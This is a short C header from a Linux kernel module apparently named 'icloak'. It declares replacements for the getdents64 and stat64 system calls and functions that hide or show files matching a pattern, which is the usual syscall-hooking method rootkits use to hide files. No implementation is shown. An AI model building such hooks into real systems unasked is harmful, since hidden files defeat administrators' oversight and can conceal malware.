/*
 *                                Copyright (C) 2017 by Rafael Santiago
 *
 * This is a free software. You can redistribute it and/or modify under
 * the terms of the GNU General Public License version 2.
 *
 */
#ifndef ICLOAK_LINUX_NATIVE_UTILS_H
#define ICLOAK_LINUX_NATIVE_UTILS_H 1

#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>

void icloak_native_free(void *ptr);

void *icloak_native_alloc(size_t size);

asmlinkage long icloak_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);

asmlinkage long (icloak_stat64)(const char __user *filename, struct stat64 __user *statbuf);

void native_hide_file(const char *pattern);

void native_show_file(const char *pattern);

#endif
